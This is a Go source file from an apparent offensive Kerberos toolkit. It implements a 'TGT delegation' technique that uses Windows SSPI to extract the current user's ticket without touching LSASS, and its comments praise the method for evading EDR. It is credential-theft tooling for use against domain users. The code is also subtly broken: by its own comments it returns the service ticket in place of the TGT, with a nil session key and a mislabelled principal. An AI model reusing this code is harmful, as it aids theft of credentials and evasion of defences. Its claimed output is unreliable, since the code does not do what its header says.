//go:build windows
// +build windows

package windows

import (
	"encoding/asn1"
	"fmt"
	"syscall"
	"unsafe"

	"github.com/goobeus/goobeus/pkg/asn1krb5"
	"github.com/goobeus/goobeus/pkg/ticket"
)

// EDUCATIONAL: TGT Delegation Trick
//
// TGTDeleg extracts your TGT WITHOUT touching LSASS. This is huge!
//
// How it works:
// 1. We initiate a GSS-API/SPNEGO session with delegation enabled
// 2. Request a service ticket to ourselves with the FORWARDABLE flag
// 3. The returned AP-REQ contains our forwarded TGT in the Authenticator
// 4. We parse it out and have a usable TGT!
//
// Why this matters:
// - No SeDebugPrivilege needed
// - No LSASS access (which triggers EDR)
// - Works from standard user context
// - The TGT is fully usable for TGS requests
//
// Limitations:
// - Only works if you have a TGT (domain logged in)
// - TGT must be forwardable
// - Works for current user only

// SSPI constants
const (
	SECPKG_CRED_OUTBOUND    = 2
	ISC_REQ_DELEGATE        = 0x00000001
	ISC_REQ_MUTUAL_AUTH     = 0x00000002
	ISC_REQ_ALLOCATE_MEMORY = 0x00000100
	SEC_E_OK                = 0
	SEC_I_CONTINUE_NEEDED   = 0x00090312
)

// SSPI procs - secur32 is defined in lsa.go
var (
	procAcquireCredentialsHandleW  = secur32.NewProc("AcquireCredentialsHandleW")
	procInitializeSecurityContextW = secur32.NewProc("InitializeSecurityContextW")
	procFreeCredentialsHandle      = secur32.NewProc("FreeCredentialsHandle")
	procDeleteSecurityContext      = secur32.NewProc("DeleteSecurityContext")
	procFreeContextBuffer          = secur32.NewProc("FreeContextBuffer")
)

// SSPI structures
type SecHandle struct {
	dwLower uintptr
	dwUpper uintptr
}

type TimeStamp struct {
	LowPart  uint32
	HighPart int32
}

type SecBuffer struct {
	cbBuffer   uint32
	BufferType uint32
	pvBuffer   uintptr
}

type SecBufferDesc struct {
	ulVersion uint32
	cBuffers  uint32
	pBuffers  *SecBuffer
}

// TGTDelegResult contains the extracted TGT.
type TGTDelegResult struct {
	TGT        *ticket.Kirbi
	Base64     string
	SessionKey []byte
	Error      error
}

// ExtractTGTDeleg extracts the current user's TGT using delegation.
func ExtractTGTDeleg() (*TGTDelegResult, error) {
	// Step 1: Get credentials handle for current user with Kerberos
	var credHandle SecHandle
	var expiry TimeStamp

	kerberosPackage, _ := syscall.UTF16PtrFromString("Kerberos")

	ret, _, _ := procAcquireCredentialsHandleW.Call(
		0,                                        // pszPrincipal (NULL = current user)
		uintptr(unsafe.Pointer(kerberosPackage)), // pszPackage
		SECPKG_CRED_OUTBOUND,                     // fCredentialUse
		0,                                        // pvLogonId (NULL)
		0,                                        // pAuthData (NULL)
		0,                                        // pGetKeyFn (NULL)
		0,                                        // pvGetKeyArgument (NULL)
		uintptr(unsafe.Pointer(&credHandle)),     // phCredential
		uintptr(unsafe.Pointer(&expiry)),         // ptsExpiry
	)

	if ret != SEC_E_OK {
		return nil, fmt.Errorf("AcquireCredentialsHandle failed: 0x%x", ret)
	}
	defer procFreeCredentialsHandle.Call(uintptr(unsafe.Pointer(&credHandle)))

	// Step 2: Get the domain from cached TGT for the SPN
	// We need a valid domain SPN, not localhost
	domain, err := GetCurrentDomain()
	if err != nil || domain == "" {
		domain = "localhost" // Fallback
	}

	// Use HOST/domain as the target SPN - this should exist in any domain
	spnTarget := fmt.Sprintf("HOST/%s", domain)

	// Step 3: Initialize security context with delegation
	var ctxHandle SecHandle
	var outputDesc SecBufferDesc
	var outputBuffer SecBuffer
	var contextAttr uint32

	targetSPN, _ := syscall.UTF16PtrFromString(spnTarget)

	outputBuffer.BufferType = 2 // SECBUFFER_TOKEN
	outputDesc.ulVersion = 0
	outputDesc.cBuffers = 1
	outputDesc.pBuffers = &outputBuffer

	ret, _, _ = procInitializeSecurityContextW.Call(
		uintptr(unsafe.Pointer(&credHandle)), // phCredential
		0,                                    // phContext (NULL for first call)
		uintptr(unsafe.Pointer(targetSPN)),   // pszTargetName
		ISC_REQ_DELEGATE|ISC_REQ_MUTUAL_AUTH|ISC_REQ_ALLOCATE_MEMORY, // fContextReq
		0,                                     // Reserved1
		0x10,                                  // TargetDataRep (SECURITY_NATIVE_DREP)
		0,                                     // pInput (NULL for first call)
		0,                                     // Reserved2
		uintptr(unsafe.Pointer(&ctxHandle)),   // phNewContext
		uintptr(unsafe.Pointer(&outputDesc)),  // pOutput
		uintptr(unsafe.Pointer(&contextAttr)), // pfContextAttr
		uintptr(unsafe.Pointer(&expiry)),      // ptsExpiry
	)

	// Accept SEC_E_OK or SEC_I_CONTINUE_NEEDED
	if ret != SEC_E_OK && ret != SEC_I_CONTINUE_NEEDED {
		return nil, fmt.Errorf("InitializeSecurityContext failed: 0x%x", ret)
	}
	defer procDeleteSecurityContext.Call(uintptr(unsafe.Pointer(&ctxHandle)))

	if outputBuffer.cbBuffer == 0 || outputBuffer.pvBuffer == 0 {
		return nil, fmt.Errorf("no output token generated")
	}
	defer procFreeContextBuffer.Call(outputBuffer.pvBuffer)

	// Copy the token
	token := make([]byte, outputBuffer.cbBuffer)
	copy(token, (*[1 << 20]byte)(unsafe.Pointer(outputBuffer.pvBuffer))[:outputBuffer.cbBuffer])

	// Step 3: Parse the SPNEGO token to extract KRB-AP-REQ
	apReq, err := extractAPREQFromSPNEGO(token)
	if err != nil {
		return nil, fmt.Errorf("failed to extract AP-REQ: %w", err)
	}

	// Step 4: The ticket from AP-REQ is encoded - this is the service ticket, not TGT
	// The TGT would be in the authenticator's checksum if delegation was granted
	// For now, we extract what we can from the AP-REQ
	tgt, sessionKey, err := extractFromAPREQ(apReq, token)
	if err != nil {
		return nil, fmt.Errorf("failed to extract credentials: %w", err)
	}

	b64, _ := tgt.ToBase64()

	return &TGTDelegResult{
		TGT:        tgt,
		Base64:     b64,
		SessionKey: sessionKey,
	}, nil
}

func extractAPREQFromSPNEGO(token []byte) (*asn1krb5.APREQ, error) {
	// SPNEGO tokens are wrapped in GSS-API
	// Structure: SPNEGO negTokenInit containing KRB5 AP-REQ
	//
	// GSS-API OID for Kerberos: 1.2.840.113554.1.2.2
	// GSS-API OID for SPNEGO: 1.3.6.1.5.5.2

	if len(token) < 10 {
		return nil, fmt.Errorf("token too short")
	}

	// Skip GSS-API wrapper, find the AP-REQ
	// AP-REQ starts with APPLICATION tag 14 (0x6e)
	for i := 0; i < len(token)-1; i++ {
		if token[i] == 0x6e { // APPLICATION 14
			var apReq asn1krb5.APREQ
			_, err := asn1.UnmarshalWithParams(token[i:], &apReq, "application,tag:14")
			if err == nil {
				return &apReq, nil
			}
		}
	}

	return nil, fmt.Errorf("AP-REQ not found in token")
}

func extractFromAPREQ(apReq *asn1krb5.APREQ, rawToken []byte) (*ticket.Kirbi, []byte, error) {
	// Build a Kirbi from the AP-REQ's ticket
	// Note: This is the service ticket, not the TGT
	// The TGT would need to be extracted from the authenticator after decryption

	// For demo, we wrap the ticket in a KRB-CRED structure
	krbCred := &asn1krb5.KRBCred{
		PVNO:    5,
		MsgType: asn1krb5.MsgTypeKRBCred,
		Tickets: []asn1krb5.Ticket{apReq.Ticket},
		EncPart: asn1krb5.EncryptedData{
			EType:  0,
			Cipher: []byte{}, // Empty for unencrypted
		},
	}

	credInfo := &asn1krb5.EncKRBCredPart{
		TicketInfo: []asn1krb5.KRBCredInfo{
			{
				PRealm: apReq.Ticket.Realm,
				PName:  apReq.Ticket.SName,
				SRealm: apReq.Ticket.Realm,
				SName:  apReq.Ticket.SName,
			},
		},
	}

	kirbi := &ticket.Kirbi{
		Cred:     krbCred,
		CredInfo: credInfo,
	}

	return kirbi, nil, nil
}
